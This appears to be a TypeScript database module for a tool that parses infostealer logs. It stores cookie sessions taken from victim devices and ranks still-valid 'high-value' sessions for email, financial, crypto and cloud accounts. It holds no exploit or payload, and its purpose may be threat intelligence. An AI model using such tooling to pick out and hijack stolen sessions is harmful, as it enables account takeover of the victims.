/**
 * Database Helper Functions for Cookie Sessions
 */

import { executeQuery } from "./mysql"
import { RowDataPacket } from "mysql2"
import type { DetectedSession } from "./stealer-parsers/cookie-session-analyzer"

/**
 * Insert cookie sessions into database
 */
export async function insertCookieSessions(
  deviceId: string,
  sessions: DetectedSession[],
): Promise<number> {
  if (sessions.length === 0) return 0

  const values = sessions.map((session) => [
    deviceId,
    session.service,
    session.service_category,
    session.account_identifier || null,
    session.session_valid,
    session.expires_at || null,
    session.cookie_count,
    session.has_auth_token,
    session.security_flags.httponly,
    session.security_flags.secure,
    session.security_flags.same_site,
    session.browser,
    session.profile,
    session.file_path,
    session.detected_at,
  ])

  const query = `
    INSERT INTO cookie_sessions (
      device_id, service, service_category, account_identifier, session_valid,
      expires_at, cookie_count, has_auth_token, security_httponly, security_secure,
      security_samesite, browser, profile, file_path, detected_at
    ) VALUES ?
  `

  try {
    await executeQuery(query, [values])
    console.log(`✅ Inserted ${sessions.length} cookie session(s)`)
    return sessions.length
  } catch (error) {
    console.error("❌ Error inserting cookie sessions:", error)
    return 0
  }
}

/**
 * Get cookie sessions by device
 */
export async function getCookieSessionsByDevice(
  deviceId: string,
): Promise<DetectedSession[]> {
  const rows = (await executeQuery(
    `
    SELECT
      service,
      service_category,
      account_identifier,
      session_valid,
      expires_at,
      cookie_count,
      has_auth_token,
      security_httponly,
      security_secure,
      security_samesite,
      browser,
      profile,
      file_path,
      detected_at
    FROM cookie_sessions
    WHERE device_id = ?
    ORDER BY service_category, service
  `,
    [deviceId],
  )) as RowDataPacket[]

  return rows.map((row) => ({
    service: row.service,
    service_category: row.service_category,
    account_identifier: row.account_identifier,
    session_valid: row.session_valid === 1,
    expires_at: row.expires_at ? new Date(row.expires_at) : undefined,
    cookie_count: row.cookie_count,
    has_auth_token: row.has_auth_token === 1,
    security_flags: {
      httponly: row.security_httponly === 1,
      secure: row.security_secure === 1,
      same_site: row.security_samesite,
    },
    browser: row.browser,
    profile: row.profile,
    file_path: row.file_path,
    detected_at: new Date(row.detected_at),
  }))
}

/**
 * Get high-value sessions (financial, email, crypto, etc.)
 */
export async function getHighValueSessions(deviceId?: string): Promise<any[]> {
  const query = deviceId
    ? `
    SELECT
      device_id,
      service,
      service_category,
      account_identifier,
      session_valid,
      expires_at,
      browser,
      detected_at
    FROM cookie_sessions
    WHERE device_id = ? AND service_category IN ('email', 'financial', 'crypto', 'cloud', 'development')
    AND session_valid = TRUE
    ORDER BY service_category, service
  `
    : `
    SELECT
      device_id,
      service,
      service_category,
      account_identifier,
      session_valid,
      expires_at,
      browser,
      detected_at
    FROM cookie_sessions
    WHERE service_category IN ('email', 'financial', 'crypto', 'cloud', 'development')
    AND session_valid = TRUE
    ORDER BY detected_at DESC
    LIMIT 100
  `

  const params = deviceId ? [deviceId] : []
  return (await executeQuery(query, params)) as RowDataPacket[]
}

/**
 * Get session statistics for a device
 */
export async function getCookieSessionStats(deviceId: string): Promise<{
  total_sessions: number
  valid_sessions: number
  expired_sessions: number
  by_category: Record<string, number>
  high_value_count: number
}> {
  // Total counts
  const totals = (await executeQuery(
    `
    SELECT
      COUNT(*) as total,
      SUM(CASE WHEN session_valid = TRUE THEN 1 ELSE 0 END) as valid,
      SUM(CASE WHEN session_valid = FALSE THEN 1 ELSE 0 END) as expired
    FROM cookie_sessions
    WHERE device_id = ?
  `,
    [deviceId],
  )) as any[]

  // By category
  const byCategory = (await executeQuery(
    `
    SELECT service_category, COUNT(*) as count
    FROM cookie_sessions
    WHERE device_id = ?
    GROUP BY service_category
  `,
    [deviceId],
  )) as RowDataPacket[]

  // High value
  const highValue = (await executeQuery(
    `
    SELECT COUNT(*) as count
    FROM cookie_sessions
    WHERE device_id = ? AND service_category IN ('email', 'financial', 'crypto', 'cloud', 'development')
    AND session_valid = TRUE
  `,
    [deviceId],
  )) as any[]

  const categoryMap: Record<string, number> = {}
  for (const row of byCategory) {
    categoryMap[row.service_category] = row.count
  }

  return {
    total_sessions: totals[0]?.total || 0,
    valid_sessions: totals[0]?.valid || 0,
    expired_sessions: totals[0]?.expired || 0,
    by_category: categoryMap,
    high_value_count: highValue[0]?.count || 0,
  }
}

/**
 * Get global session statistics
 */
export async function getGlobalCookieSessionStats(): Promise<{
  total_sessions: number
  total_devices_with_sessions: number
  valid_sessions: number
  by_category: Record<string, number>
  by_service: Record<string, number>
  high_value_count: number
}> {
  // Total counts
  const totals = (await executeQuery(`
    SELECT
      COUNT(*) as total,
      COUNT(DISTINCT device_id) as devices,
      SUM(CASE WHEN session_valid = TRUE THEN 1 ELSE 0 END) as valid
    FROM cookie_sessions
  `)) as any[]

  // By category
  const byCategory = (await executeQuery(`
    SELECT service_category, COUNT(*) as count
    FROM cookie_sessions
    WHERE session_valid = TRUE
    GROUP BY service_category
    ORDER BY count DESC
  `)) as RowDataPacket[]

  // By service (top 20)
  const byService = (await executeQuery(`
    SELECT service, COUNT(*) as count
    FROM cookie_sessions
    WHERE session_valid = TRUE
    GROUP BY service
    ORDER BY count DESC
    LIMIT 20
  `)) as RowDataPacket[]

  // High value
  const highValue = (await executeQuery(`
    SELECT COUNT(*) as count
    FROM cookie_sessions
    WHERE service_category IN ('email', 'financial', 'crypto', 'cloud', 'development')
    AND session_valid = TRUE
  `)) as any[]

  const categoryMap: Record<string, number> = {}
  for (const row of byCategory) {
    categoryMap[row.service_category] = row.count
  }

  const serviceMap: Record<string, number> = {}
  for (const row of byService) {
    serviceMap[row.service] = row.count
  }

  return {
    total_sessions: totals[0]?.total || 0,
    total_devices_with_sessions: totals[0]?.devices || 0,
    valid_sessions: totals[0]?.valid || 0,
    by_category: categoryMap,
    by_service: serviceMap,
    high_value_count: highValue[0]?.count || 0,
  }
}
